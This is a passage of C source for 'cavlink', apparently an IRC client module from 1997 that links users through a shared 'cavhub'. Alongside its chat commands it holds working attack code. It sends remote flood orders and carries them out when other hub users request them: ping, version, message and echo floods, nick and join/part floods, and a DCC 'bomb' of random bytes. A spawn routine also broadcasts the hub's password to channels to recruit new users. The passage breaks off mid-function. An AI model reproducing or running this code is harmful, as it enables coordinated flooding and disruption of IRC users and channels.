#define CAV_VERSION "0.11"

/*
 *
 * This is the cavlink link handler.
 * Written by Colten Edwards. (C) March 97
 */
#include "irc.h"
#include "struct.h"
#include "dcc.h"
#include "ircaux.h"
#include "ctcp.h"
#include "status.h"
#include "lastlog.h"
#include "server.h"
#include "screen.h"
#include "vars.h" 
#include "misc.h"
#include "output.h"
#include "cset.h"
#include "module.h"
#define INIT_MODULE
#include "modval.h"

#include <sys/time.h>

SocketList *cavhub = NULL;
int cav_socket = -1;

char cavbuf[BIG_BUFFER_SIZE+1];
char *cav_nickname = NULL;
char *cav_channel = NULL;
int cav_port = 7979;
time_t cavping = 0;

SocketList *cavlink_connect(char *host, unsigned short port);

char cav_version[] = CAV_VERSION;

#define cparse convert_output_format

#define MAXCAVPARA 30

int check_cavlink(SocketList *Client, char *str, int active)
{
	if ((active && !Client) || (!active && Client))
	{
		bitchsay(str?str:"Connect to a cavhub first");
		return 0;
	}
	return 1;
}

int cav_say(char *format, ...)
{
Window  *old_target_window = target_window;
int     lastlog_level;
	lastlog_level = set_lastlog_msg_level(LOG_CRAP);
	if (get_dllint_var("cavlink_window") > 0)
		target_window = get_window_by_name("CAVLINK");
	if (window_display && format)
	{
		va_list args;
		va_start (args, format);
		vsnprintf(&(cavbuf[strlen(get_dllstring_var("cavlink_prompt"))+1]), BIG_BUFFER_SIZE, format, args);
		va_end(args);
		strcpy(cavbuf, get_dllstring_var("cavlink_prompt"));
		cavbuf[strlen(get_dllstring_var("cavlink_prompt"))] = ' ';
                if (*cavbuf)
		{
			add_to_log(irclog_fp, 0, cavbuf, 0);
			add_to_screen(cavbuf);
		}
	}
	if (get_dllint_var("cavlink_window")> 0)
		target_window = old_target_window;
	set_lastlog_msg_level(lastlog_level);
	return 0;
}

BUILT_IN_DLL(cavsay)
{
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	if (command)
	{
		if (!my_stricmp(command, "CLSAY"))
		{
			dcc_printf(cavhub->is_read, "lsay %s\n", args);
			return;	
		}
	}
	if (args && *args)
		dcc_printf(cavhub->is_read, "say %s\n", args);
}

BUILT_IN_DLL(cclose)
{
	if (cav_socket == -1)
		return;
	close_socketread(cav_socket);
	cavhub = NULL;
	cav_socket = -1;	
}

BUILT_IN_DLL(cav_link)
{
char *host, *passwd, *port;
int sucks = 0;
	if (!check_cavlink(cavhub, "Already connected to a CavHub", 0))
		return;
	if (!(host = next_arg(args, &args)))
		host = get_dllstring_var("cavlink_host");
	if (!(port = next_arg(args, &args)))
		sucks = get_dllint_var("cavlink_port");
	else 
		sucks = my_atol(port);
	if (sucks < 100)
	{
		cav_say("Invalid port specified %d", sucks);
		return;
	}
	if (!(passwd = next_arg(args, &args)))
		passwd = get_dllstring_var("cavlink_pass");
	if (host && sucks && passwd)
	{
		cavhub = cavlink_connect(host, (unsigned short)sucks);
		set_dllstring_var("cavlink_host", host);
		set_dllstring_var("cavlink_pass", passwd);
		set_dllint_var("cavlink_port", sucks);
	}
	else
		cav_say("No %s specified", !host?"host":!passwd?"passwd":"arrggh");
}

BUILT_IN_DLL(cmode)
{
char *nick, *mode;
char buffer[BIG_BUFFER_SIZE];
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	mode = next_arg(args, &args);
	if (mode && (!my_stricmp(mode, "+a") || !my_stricmp(mode, "-a")) && args)
	{
		*buffer = 0;
		while ((nick = next_arg(args, &args)))
		{
			*buffer = 0;
			if (!my_stricmp(mode, "+a"))
				sprintf(buffer, "berserk %s\n", nick);
			else if (!my_stricmp(mode, "-a"))
				sprintf(buffer, "calm %s\n", nick);
			dcc_printf(cavhub->is_read, buffer);
		}
	} else
		cav_say("%s", cparse("%BUsage%W:%n /$0 +%Y|%n-a nick", "%s", command));
}

BUILT_IN_DLL(cattack)
{
char *tmp, *times = "6", *target = NULL, *q;
char *comm = NULL;
char *type[] = { "dcc_bomb", "version_flood", "ping_flood", "message_flood", "quote_flood", "cycle_flood", "nick_flood", "echo_flood", NULL};
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	if (!my_stricmp(command, "CATTACK"))
	{
		set_dllint_var("cavlink_attack", get_dllint_var("cavlink_attack") ? 0 : 1);
		cav_say(cparse("%RToggled Attack %W$0", "%s", on_off(get_dllint_var("cavlink_attack"))));
		return;
	}
	if (!my_stricmp(command, "cbomb"))
		comm = type[0];
	else if (!my_stricmp(command, "cvfld"))
		comm = type[1];
	else if (!my_stricmp(command, "cpfld"))
		comm = type[2];
	else if (!my_stricmp(command, "cmfld"))
		comm = type[3];
	else if (!my_stricmp(command, "cqfld"))
		comm = type[4];
	else if (!my_stricmp(command, "ccfld"))
		comm = type[5];
	else if (!my_stricmp(command, "cnfld"))
		comm = type[6];
	else if (!my_stricmp(command, "cefld"))
		comm = type[7];
	if (!my_stricmp(command, "cspawn"))
	{
		comm = "spawn_link";
		target = "all";
		times = "0";
		if (args && *args)
		{
			q = next_arg(args, &args);
			if (q && is_channel(q))
				target = q;
		}
	}
	else if (!my_stricmp(comm, "quote_flood") || !my_stricmp(comm, "message_flood") || !my_stricmp(comm, "echo_flood"))
	{
		if (!my_strnicmp(args, "-t", 2))
		{
			tmp = next_arg(args, &args);
			times = next_arg(args, &args);
			if (times && !isdigit(*times))
				times = "6";
			target = next_arg(args, &args);
		} else
			target = next_arg(args, &args);
		if (target && args)
			dcc_printf(cavhub->is_read, "attack %s %s %s %s\n", comm, times, target, args);
		else
			cav_say(cparse("%BUsage%W:%n /$0  %K[%n-t #%K]%n target%Y|%ntarg1,targ2...", "%s", command)); 
		return;
	}
	else
	{
		if (!my_strnicmp(args, "-t", 2))
		{
			tmp = next_arg(args, &args);
			times = next_arg(args, &args);
			if (times && !isdigit(*times))
				times = "6";
			target = next_arg(args, &args);
		} else
			target = next_arg(args, &args);
	}
	if (target)
		dcc_printf(cavhub->is_read, "attack %s %s %s\n", comm, times, target);
	else
		cav_say(cparse("%BUsage%W:%n /$0  %K[%n-t #%K]%n target%Y|%ntarg1,targ2...", "%s", command)); 
}

BUILT_IN_DLL(cunlink)
{
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	dcc_printf(cavhub->is_read, "quit%s%s\n", (args && *args)?" ":empty_string, (args && *args)?args:empty_string);
	cavhub->flags |= DCC_DELETE;
	cavhub = NULL;
}

BUILT_IN_DLL(cgrab)
{
char *target;
char buffer[BIG_BUFFER_SIZE];
int server = -1;
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	if ((server = current_window->server) == -1)
		server = primary_server;
		
	if (!args || !*args)
		args = get_current_channel_by_refnum(0);
	if ((server != -1) && args)
	{
		while ((target = next_arg(args, &args)))
		{
			snprintf(buffer, BIG_BUFFER_SIZE, "PRIVMSG %s :%cCLINK %s %d %s%c", target, CTCP_DELIM_CHAR, get_dllstring_var("cavlink_host"), get_dllint_var("cavlink_port"), get_dllstring_var("cavlink_pass"), CTCP_DELIM_CHAR);
			my_send_to_server(server, buffer);
		}
	}
	else
		cav_say(cparse("%BUsage%W:%n /$0  target%Y|%ntarg1 targ2...", "%s", command)); 
}

BUILT_IN_DLL(cavgen)
{
	if (!check_cavlink(cavhub, NULL, 1))
		return;
	if (command)
	{
		char buffer[BIG_BUFFER_SIZE];

		*buffer = 0;		
		if (!my_stricmp(command, "CWHO"))
			sprintf(buffer, "who\n");
		else if (!my_stricmp(command, "CRWHO"))
			sprintf(buffer, "rwho\n");
		else if (!my_stricmp(command, "CSTATS"))
			sprintf(buffer, "stats\n");
		else if (!my_stricmp(command, "CUPTIME"))
			sprintf(buffer, "uptime\n");
		else if (!my_stricmp(command, "CMSG") && args)
		{
			char *nick = next_arg(args, &args);
			if (args && *args)
			{
				sprintf(buffer, "msg %s %s\n", nick, args);
				addtabkey(nick, "cmsg", 0);
				cav_say("%s",cparse("%g[%r$0%g(%W$1%g)]%n $2-","%s %s %s","cmsg",nick, args));
			}
		}
		else if (!my_stricmp(command, "COPER") && args)
			sprintf(buffer, "oper %s\n", args);
		else if (!my_stricmp(command, "CPART"))
			sprintf(buffer, "leave\n");
		else if (!my_stricmp(command, "CLIST"))
			sprintf(buffer, "list\n");
		else if (!my_stricmp(command, "CJOIN") && args)
			sprintf(buffer, "join %s\n", args);
		else if (!my_stricmp(command, "CKILL") && args)
		{
			char *nick = next_arg(args, &args);
			sprintf(buffer, "kill %s%s%s\n", nick, args? " ":empty_string, args ? args:empty_string);
		}
		else if (!my_stricmp(command, "CPONG"))
		{
			if (cavping == 0)
			{
				sprintf(buffer, "ping\n");
				cavping = time(NULL);
			} else
				cav_say("Server ping already in progress");
		}
		else if (!my_stricmp(command, "CPING"))
		{
			char *nick = next_arg(args, &args);
			if (nick)
				sprintf(buffer, "msg %s PING %ld\n", nick, time(NULL));
			else
				sprintf(buffer, "say PING %ld\n", time(NULL));
		}
		else if (!my_stricmp(command, "CVERSION"))
			sprintf(buffer, "version\n");
		else if (!my_stricmp(command, "CVER"))
		{
			char *nick = next_arg(args, &args);
			if (nick)
				sprintf(buffer, "msg %s VERSION\n", nick);
			else
				sprintf(buffer, "say VERSION\n");
		}
		else if (!my_stricmp(command, "CWALL") && args)
			sprintf(buffer, "wall %s\n", args);
		else if (!my_stricmp(command, "CRWALL") && args)
			sprintf(buffer, "rwall %s\n", args);
		else if (!my_stricmp(command, "CQUIT"))
			sprintf(buffer, "quit%s%s\n", (args && *args)?" ":empty_string, (args && *args)?args:empty_string);
		else if (!my_stricmp(command, "CMOTD"))
			sprintf(buffer, "motd\n");
		else if (!my_stricmp(command, "CDIE"))
			sprintf(buffer, "die\n");
		else if (!my_stricmp(command, "CCONNECT") && args)
			sprintf(buffer, "connect %s\n",args);
		else if (!my_stricmp(command, "CME") && args)
			sprintf(buffer, "say ACTION %s\n",args);
		else if (!my_stricmp(command, "CLUSER"))
			sprintf(buffer, "luser\n");
		else if (!my_stricmp(command, "CINFO") || !my_stricmp(command, "CWHOIS"))
		{
			char *nick = next_arg(args, &args);
			if (nick)
				sprintf(buffer, "msg %s INFO\n", nick);
			else
				sprintf(buffer, "say INFO\n");
		} 
		else if (!my_stricmp(command, "CBOOT") && args)
		{
			char *nick = next_arg(args, &args);
			sprintf(buffer, "kill %s\n", nick);
		}
		else if (!my_stricmp(command, "CHUBS"))
		{
			char *nick = next_arg(args, &args);
			sprintf(buffer, "hubs%s%s\n", nick?" ":empty_string, nick?nick:empty_string);
		}
		else if (!my_stricmp(command, "CSPLIT"))
			sprintf(buffer, "split\n");
		else if (!my_stricmp(command, "CNICK") && args)
		{
			char *nick = next_arg(args, &args);
			sprintf(buffer, "nick %s\n", nick);
		}
		else if (!my_stricmp(command, "CKLINE"))
		{
			char *nick = next_arg(args, &args);
			sprintf(buffer, "kline%s%s\n", nick?" ":empty_string, nick?nick:empty_string);
		}
		if (*buffer)
			dcc_printf(cavhub->is_read, buffer);
		return;
	}
	if (args && *args)
		dcc_printf(cavhub->is_read, "%s\n", args);
}

int do_nick_flood(int server, char *target, int repcount, char *key)
{
int i;
ChannelList *chan;
int joined = 0;
char *channel;

	channel = make_channel(target);
	if (server == -1)
		server = primary_server;
	if (server == -1)
		return 1;
	chan = get_server_channels(server);
	if (!chan || !(chan = (ChannelList *)find_in_list((List **)chan, channel, 0)))
	{
		my_send_to_server(server, "JOIN %s%s%s\n", channel, key?" ":empty_string, key?key:empty_string);
		joined = 1;
	}

	for (i = 0; i < repcount; i++)
		my_send_to_server(server, "NICK %s", random_str(3, 9));
	if (joined)
		my_send_to_server(server, "PART %s\n", channel);
	return 1;
}

int do_cycle_flood(int server, char *target, int repcount, char *key)
{
char *channel;
ChannelList *chan = NULL;
char *key1 = NULL;
int i;
	channel = make_channel(target);
	if (server == -1)
		server = primary_server;
	if (server == -1)
		return 1;
	chan = get_server_channels(server);
	if (!chan || !(chan = (ChannelList *)find_in_list((List **)chan, channel, 0)))
	{
		for (i = 0; i < repcount; i++)
			my_send_to_server(server, "JOIN %s%s%s\nPART %s\n", channel, key?" ":empty_string, key?key:empty_string, channel);
	}
	else
	{
		key1 = m_strdup(chan->key);
		for (i = 0; i < repcount; i++)
			my_send_to_server(server, "PART %s\nJOIN %s%s%s\n", channel, channel, key1?" ":empty_string, key1?key1:empty_string);
		new_free(&key1);
	}
	return 1;
}

static unsigned long randm (unsigned long l)
{
	unsigned long t1, t2, t;
	struct timeval tp1;
	get_time(&tp1);
	if (l == 0)
		l = (unsigned long) -1;
	get_time(&tp1);
	t1 = (unsigned long)tp1.tv_usec;
	get_time(&tp1);
	t2 = (unsigned long)tp1.tv_usec;
	t = (t1 & 65535) * 65536 + (t2 & 65535);
	return t % l;
}                                        
                        
int do_dccbomb(int server, char *target, int repcount)
{
char buffer[BIG_BUFFER_SIZE];
int i;
char *text = NULL;
	if (server == -1)
		server = primary_server;
	if (server == -1)
		return 1;
	text = alloca(100);
	for (i = 0; i < repcount; i++)
	{
		snprintf(buffer, IRCD_BUFFER_SIZE, "%ld%ld%ld %ld%ld%ld %ld%ld%ld %ld%ld%ld", randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i, randm(time(NULL))+i, randm(time(NULL))+i, time(NULL)+i);
		for (i = 0; i < randm(80); i++)
			text[i] = randm(255)+1;
		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :DCC SEND %s 2293243493 8192 6978632", target, text);
		my_send_to_server(server, buffer);
	}
	return 1;
}

int handle_attack (SocketList *Client, char **ArgList)
{
char *type, *times, *target, *extra = NULL;
char *nick, *host;
int i, repcount, done = 0;
char buffer[BIG_BUFFER_SIZE+1];

	if (!get_dllint_var("cavlink_attack"))
		return 1;

	nick = *(ArgList+1);
	host = *(ArgList+2);

	type = *(ArgList+3);
	times = *(ArgList+4);

	if (!my_stricmp(type, "message_flood") || !my_stricmp(type, "quote_flood"))
	{
		PasteArgs(ArgList, 6);
		target = *(ArgList+5);
		extra = *(ArgList+6);
	}
	else
		target = *(ArgList+5);
	
	*buffer = 0;
	if (!my_stricmp(type, "spawn_link"))
	{
		char *chan = NULL;
		int server = current_window->server;
		int tmp_server = from_server;
		if (server == -1)
			server = primary_server;
		if (((server = current_window->server) == -1) || get_dllint_var("cavlink_floodspawn") || !get_server_channels(current_window->server))
		{
			cav_say("%s", cparse("%BIgnoring Spawn link request by $0!$1 to : $2", "%s %s %s", nick, host, target));
			return 1;
		}
		from_server = server;
		if (!my_stricmp(target, "all"))
		{
			char *p;
			chan = create_channel_list(current_window);

			while((p = strchr(chan, ' ')))
				*p=',';
			if (chan[strlen(chan)-1] == ',')
				chop(chan, 1);
			snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :CLINK %s %d %s", chan, get_dllstring_var("cavlink_host"), get_dllint_var("cavlink_port"), get_dllstring_var("cavlink_pass"));
			new_free(&chan);
		} 
		else
		{
			ChannelList *ch;
			ch = get_server_channels(server);
			if (find_in_list((List **)ch, target, 0))
				snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :CLINK %s %d %s", make_channel(target), get_dllstring_var("cavlink_host"), get_dllint_var("cavlink_port"), get_dllstring_var("cavlink_pass"));
		}
		if (*buffer)
		{
			my_send_to_server(server, buffer);
			cav_say("%s", cparse("%BSpawn link request by $0!$1 to : $2", "%s %s %s", nick, host, chan ? chan : target));
		}
		else
			cav_say("%s", cparse("%BIgnoring Spawn link request by $0!$1 to : $2", "%s %s %s", nick, host, target));
		from_server = tmp_server;
		return 0;
	}
	if (!type || !target || !times)
	{
		/* Illegal request */
		cav_say("%s", cparse("%BIllegal attack request from $0!$1", "%s %d %s %s %s", nick, host));
		return 0;
	}
	repcount = my_atol(times);
	if (repcount <= 0 || repcount > get_dllint_var("cavlink_attack_times"))
		repcount = get_dllint_var("cavlink_attack_times");

	if (!my_stricmp(type, "quote_flood") && get_dllint_var("cavlink_floodquote"))
		snprintf(buffer, IRCD_BUFFER_SIZE, "%s %s", target, extra);
	else if (!my_stricmp(type, "version_flood") && get_dllint_var("cavlink_floodversion"))
		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :VERSION", target);
	else if (!my_stricmp(type, "ping_flood") && get_dllint_var("cavlink_floodping"))
		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :PING %ld", target, time(NULL));
	else if (!my_stricmp(type, "echo_flood") && get_dllint_var("cavlink_floodecho"))
		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :ECHO %s", target, extra);
	else if (!my_stricmp(type, "message_flood") && get_dllint_var("cavlink_floodmsg"))
		snprintf(buffer, IRCD_BUFFER_SIZE, "PRIVMSG %s :%s", target, extra);
	else if (!my_stricmp(type, "dcc_bomb") && get_dllint_var("cavlink_flooddccbomb"))
		done = do_dccbomb(current_window->server, target, repcount);
	else if (!my_stricmp(type, "cycle_flood") && get_dllint_var("cavlink_floodcycle"))
		done = do_cycle_flood(current_window->server, target, repcount, *(ArgList+6));
	else if (!my_stricmp(type, "nick_flood") && get_dllint_var("cavlink_floodnick"))
		done = do_nick_flood(current_window->server, target, repcount, *(ArgList+6));

	if (*buffer)
	{
		for (i = 0; i < repcount; i++)
			my_send_to_server(-1, buffer);
		done = 1;
	}
	if (done)
		cav_say("%s", cparse("%BAttack request %K[%R$0%K]%B x %R$1%B by %R$2%B to %W: %R$4", "%s %d %s %s %s", type, repcount, nick, host, target));
	else
		cav_say("%s", cparse("%BIgnoring Attack request %K[%R$0%K]%B x %R$1%B by %R$2%B to %W: %R$4", "%s %d %s %s %s", type, repcount, nick, host, target));
	return 0;
}

int handle_split(SocketList *Client, char **ArgList)
{
char *t, *serv, *links;
static int start_split = 0;
	t = *(ArgList+1);
	if (!my_stricmp(t, "End"))
	{
		cav_say("%s", cparse("End of split list", NULL, NULL));
		start_split = 0;
		return 0;
	}
	serv = *(ArgList+2);
	links = *(ArgList+3);
	if (!start_split)
		cav_say("%s", cparse("%B$[25]0 $[10]1 $[30]2", "Server Time Uplink", NULL));
	cav_say("%s", cparse("$[25]1 $[10]0 $[30]2", "%s %s %s", t, serv, links?links:"*unknown*"));
	start_split++;
	return 0;
}

int handle_who (SocketList *Client, char **ArgList, int remote)
{
char *chan = NULL, *idle = NULL, *flags = NULL;
char *nick, *host;
	if (strcmp("end", *(ArgList+1)))
	{
		if (!remote)
		{
			nick = *(ArgList+1);
			host = *(ArgList+2);
			chan = *(ArgList+3);
			if (!my_stricmp("(chan:",chan)) 
			{
				chan = *(ArgList+4);
				chop(chan, 1);
			}  
			else 
				chan = NULL;
			flags = *(ArgList+5);
			PasteArgs(ArgList, 6);
			if (*(ArgList+6))
				malloc_sprintf(&idle,"idle: %s", *(ArgList+6));
		}
		else
		{
			nick = *(ArgList+2);
			host = *(ArgList+3);
			chan = *(ArgList+4);
			if (!my_stricmp("(chan:",chan)) 
			{
				chan = *(ArgList+5);
				chop(chan, 1);
			}  
			else 
				chan = NULL;
			flags = *(ArgList+6);
			PasteArgs(ArgList, 7);
			if (*(ArgList+7))
				malloc_sprintf(&idle,"idle: %s", *(ArgList+7));
		}
		cav_say("%s",cparse("%g$[10]0%g$[-10]1%G!%g$[30]2 %G$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));
#if 0
		if (remote)
/*			cav_say("%s",cparse("%G$[20]0%G$[-10]1%g!%g$[25]2 %g$[3]3 $4-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));*/
			cav_say("%s",cparse("$0-", "%s %s %s %s %s",chan ? chan:"*none*",nick,host,flags,idle?idle:"ÿÿ"));
		else
#endif
		new_free(&idle);
	}
	return 0;
}

int handle_llbot (SocketList *Client, char **ArgList)
{
char *host, *port;
	host= *(ArgList+4);
	port= *(ArgList+5);
	cav_say("llbot attemping connect to %s %s",host, port);
	return 0;
}

char *ctcp_info = NULL;
UserList *cav_info = NULL;

char *handle_ctcp(SocketList *Client, char *nick, char *host, char *chan, char *ptr)
{
char local_ctcp_buffer[IRCD_BUFFER_SIZE+1];
char the_ctcp[IRCD_BUFFER_SIZE+1];
char last[IRCD_BUFFER_SIZE+1];
int allow_reply = 1;
char *ctcp_command;
char *ctcp_arg;
int delim = charcount(ptr, CTCP_DELIM_CHAR);
int its_me = 0;

	if (delim < 2)
		return ptr;
	if (delim > 8)
		allow_reply = 0;		
	its_me = !my_stricmp(nick, cav_nickname) ? 1 : 0;
	
	strmcpy(local_ctcp_buffer, ptr, IRCD_BUFFER_SIZE-2);
	for (;; strmcat(local_ctcp_buffer, last, IRCD_BUFFER_SIZE-2))
	{
		split_CTCP(local_ctcp_buffer, the_ctcp, last);
		if (!*the_ctcp)
			break;
		if (!allow_reply)
			continue;
		ctcp_command = the_ctcp;
		ctcp_arg = index(the_ctcp, ' ');
		if (ctcp_arg)
			*ctcp_arg++ = 0;
		else
			ctcp_arg = empty_string;
		if (!my_stricmp(ctcp_command, "PING") && !its_me)
		{
			dcc_printf(Client->is_read, "msg %s PONG %s\n",nick, ctcp_arg);
			cav_say(cparse("CTCP $0 from $1 to $3","PING %s %s %s",nick,host,chan ? chan : "you"));
			*local_ctcp_buffer = 0;
		}
		if (!my_stricmp(ctcp_command, "PONG") && *ctcp_arg)
		{
			time_t tme;
			tme = strtoul(ctcp_arg, &ctcp_arg, 10);
			cav_say(cparse("CTCP $0 reply from $1 : $3secs","PONG %s %s %d %s",nick,host, time(NULL)-tme, chan ? chan:empty_string));
			*local_ctcp_buffer = 0;
		}
		else if (!my_stricmp(ctcp_command, "VERSION") && *ctcp_arg)
		{
			cav_say(cparse("$0-","%s %s %s %s","VERSION",nick,host, ctcp_arg));
			*local_ctcp_buffer = 0;
		}
		else if (!my_stricmp(ctcp_command, "VERSION") && !its_me)
		{
			if (!my_stricmp(nick, cav_nickname))
				cav_say(cparse("$0 $1","%s %s %s %s","VERSION",chan? chan : nick,host, chan?chan:empty_string));
			else
				cav_say(cparse("CTCP $0 from $1","%s %s %s %s","VERSION",nick,host, chan?chan:empty_string));
			*local_ctcp_buffer = 0;
			dcc_printf(Client->is_read, "msg %s VERSION %s cavlink %s\n", nick, irc_version, cav_version);
		}
		else if (!my_stricmp(ctcp_command, "ACTION"))
		{
			cav_say(cparse("%W*%n $2 $4-","%s %s %s %s %s","ACTION",cav_nickname, nick,host, ctcp_arg));
			*local_ctcp_buffer = 0;
			addtabkey(nick, "cmsg", 0);
		}
		else if (!my_stricmp(ctcp_command, "AWAY"))
		{
			cav_say(cparse("$1!$2 is now away. ($3-)","%s %s %s %s","AWAY",nick,host, ctcp_arg));
			*local_ctcp_buffer = 0;
		}
		else if (!my_stricmp(ctcp_command, "INFO") && !*ctcp_arg && !its_me)
		{
			char *serv, *channels;
			char *msg;
			serv = (get_window_server(0) != -1) ? get_server_itsname(get_window_server(0)) : empty_string;
			if (current_window->server != -1)
			{
				ChannelList *tmp;
				channels = m_strdup(empty_string);
				for (tmp = get_server_channels(current_window->server); tmp; tmp = tmp->next)
					m_3cat(&channels, tmp->channel, " ");
			}
			else
				channels = m_strdup(empty_string);
			cav_say(cparse("CTCP $0-","%s %s %s","INFO",nick,host));
			dcc_printf(Client->is_read, "msg %s INFO %s %s %s", nick, nickname, serv, *channels?channels:"*none*");
			if ((msg = get_server_away(from_server)))
				dcc_printf(Client->is_read, "msg %s INFO AWAY %s\n", nick, msg);
			dcc_printf(Client->is_read, "msg %s INFO END\n", nick);
			new_free(&channels);
			*local_ctcp_buffer = 0;
		}
		else if (!my_stricmp(ctcp_command, "INFO") && *ctcp_arg)
		{
			UserList *n;
			if (!my_stricmp(ctcp_arg, "END"))
			{
				cav_say(cparse("$[10]0 $[20]1 $2", "Nick Server Channels", NULL));
				for(; ((n = cav_info) != NULL);)
				{
					cav_info = cav_info->next;
					cav_say(cparse("$[10]0 $[20]1 $2-", "%s", n->channels));
					if (n->password)
						cav_say(cparse("$0-", "%s", n->password));
					new_free(&n->password);
					new_free(&n->channels);
					new_free(&n->nick);
					new_free(&n->host);
					new_free((char **)&n);
				}
			}
			else
			{
				if (!(n = (UserList *)remove_from_list((List **)&cav_info, nick)))
				{
					n = (UserList *)new_malloc(sizeof(UserList));
					n->nick = m_strdup(nick);
					n->host = m_strdup(host);
				}
				if (!my_strnicmp(ctcp_arg, "AWAY", 4))
					n->password = m_strdup(ctcp_arg);
				else
					n->channels = m_strdup(ctcp_arg);
				add_to_list((List **)&cav_info, (List *)n);
			}
			*local_ctcp_buffer = 0;
		}
	}
	return strcpy(ptr, local_ctcp_buffer);
}

int handle_say (SocketList *Client, char **ArgList)
{
char *chan, *nick, *host, *str;

	chan = *(ArgList+1);
	nick = *(ArgList+2);
	host = *(ArgList+3);
	str  = *(ArgList+4);
	PasteArgs(ArgList, 4);

	str = handle_ctcp(Client, nick, host, chan, str);
	if (!str || !*str)
		return 0;
	if (!my_stricmp(nick, cav_nickname))
		cav_say(cparse("%g<%W$2%g>%n $4-", "%s %s %s %s %s", update_clock(GET_TIME), chan, nick, host, str));
	else
		cav_say(cparse("%G<%R$1%g/%Y$2%G>%n $4-", "%s %s %s %s %s", update_clock(GET_TIME), chan, nick, host, str));
	return 0;
}

void cav_away(SocketList *Client, char *nick)
{
NickTab *tmp;
	if (get_server_away(from_server) && nick)
	{
		for (tmp = tabkey_array;tmp; tmp = tmp->next);
		{
			if (!tmp || (tmp->nick && !my_stricmp(tmp->nick, nick)))
				return;
		}
		dcc_printf(Client->is_read, "msg %s AWAY %s\n", nick, get_server_away(from_server));
	}
}

int handle_msg (SocketList *Client, char **ArgList)
{
char *to, *nick, *host, *str;
	to = *(ArgList+1);
	nick = *(ArgList+2);
	host = *(ArgList+3);
	str = *(ArgList+4);
	PasteArgs(ArgList, 4);
	str = handle_ctcp(Client, nick, host, NULL, str);
	if (!str || !*str)
		return 0;
	cav_say("%s",cparse("%g[%W$0%g(%n$1%g)]%n $2-","%s %s %s",nick,host,str));
	cav_away(Client, nick);
	addtabkey(nick, "cmsg", 0);
	return 0;
}


static void cavlink_handler (int s)
{
int output = 1;
char *p = NULL;
char *TrueArgs[MAXCAVPARA+1] = { NULL };
int count = 0;
char **ArgList;
char *comm;
char tmpstr[BIG_BUFFER_SIZE+1];
char *tmp = tmpstr;

switch(dgets(tmpstr, s, 0, BIG_BUFFER_SIZE, NULL))
{
	case 0:
		return;
	case -1:
	{
		put_it("error on socket");
		close_socketread(s);
		cav_socket = -1;
		cavhub = NULL;
		return;
	}
	default:
	{
	if (!*tmp)
	{
		cavhub = NULL;
		return;
	}
	chop(tmp, 1);
	if (my_strnicmp(tmp, "caverns:", 8))
	{
		if (wild_match("password:", tmp))
		{
			dcc_printf(s, "%s\n", get_dllstring_var("cavlink_pass"));
			output = 0;
		}
		else if (wild_match("nick:", tmp))
		{
			dcc_printf(s, "%s\n", cav_nickname);
			output = 0;
		}
		else if (wild_match("that nick is not unique!",tmp))
		{
			malloc_sprintf(&cav_nickname, "_%9.9s", nickname);
			dcc_printf(s, "_%9.9s\n", cav_nickname);
		}
		else if (wild_match("welcome to caverns.", tmp))
		{
			dcc_printf(s, "motd\n");
			dcc_printf(s, "luser\n");
			dcc_printf(s, "status\n");
		}
		if (output)
			cav_say(tmp);
		return;
	}
	if (wild_match("% % restored your attack ability",tmp))
	{
		p=next_arg(tmp,&tmp); 
		p=next_arg(tmp,&tmp);
		cav_say("%s",cparse("%W$0%g set mode %W[%G $1 $2 %W]%n", "%s +a %s",p,cav_nickname));
		return;
	}
	else if (wild_match("% % removed your attack ability",tmp))
	{
		p=next_arg(tmp,&tmp); 
		p=next_arg(tmp,&tmp);
		cav_say("%s",cparse("%W$0%g set mode %W[%G $1 $2 %W]%n", "%s -a %s",p,cav_nickname));
		return;
	}
	else if (wild_match("% % can now attack",tmp))
	{
		p=next_arg(tmp,&tmp); p=next_arg(tmp,&tmp);
		cav_say("%s",cparse("%W$0%g set mode %W[%G $1 $2 %W]%n", "%s +a %s",p, get_dllstring_var("cavlink_host")));
		return;
	}
	else if (wild_match("% % can no longer attack",tmp))
	{
		p=next_arg(tmp,&tmp); p=next_arg(tmp,&tmp);
		cav_say("%s",cparse("%W$0%g set mode %W[%G $1 $2 %W]%n", "%s -a %s",p, get_dllstring_var("cavlink_host")));
		return;
	}
	else if (wild_match("% % % wall *",tmp))
	{
		char *nick, *host;
		p=next_arg(tmp,&tmp);
		nick=next_arg(tmp,&tmp);
		host=next_arg(tmp,&tmp);
		p=next_arg(tmp,&tmp);
		cav_say("%s",cparse("%g!%WWALL%g! [%n$0%g(%W$1%g)]%n $2-","%s %s %s",nick,host,tmp));
		return;
	}
	else if (wild_match("% you are an oper", tmp))
	{
		cav_say("%s", cparse("You are now an operator", "%s", cav_nickname));
		return;
	}
	ArgList = TrueArgs;
	count = BreakArgs(tmp, NULL, ArgList, 1);
        if (!(comm = (*++ArgList)) || !*ArgList)
                        return;         /* Empty line from server - ByeBye */

	if (!strcmp(comm, "motd"))
	{
		PasteArgs(ArgList, 1);
		p = *(ArgList+1);
		output = cav_say((p?p:empty_string));
	}
	else if (((!strcmp(comm,"begin") || !strcmp(comm, "end")) && !strcmp("motd", *(ArgList+1))))
		output = 0;
	else if (!strcmp(comm, "list"))
	{
		char *nick, *host;
		nick = *(ArgList+1);
		host = *(ArgList+2);
		output = cav_say("%s", cparse("$0: $1", "%s %s",nick,host));
	}
	else if (!strcmp(comm, "llbot"))
		output = handle_llbot(cavhub, ArgList);
	else if (!strcmp(comm, "status"))
		output = cav_say("%s",cparse("llbot %gwatching %W$0","%s", *(ArgList+2)));
	else if (!strcmp(comm, "part")) 
	{
		char *chan, *nick, *host;
		chan = *(ArgList+1);
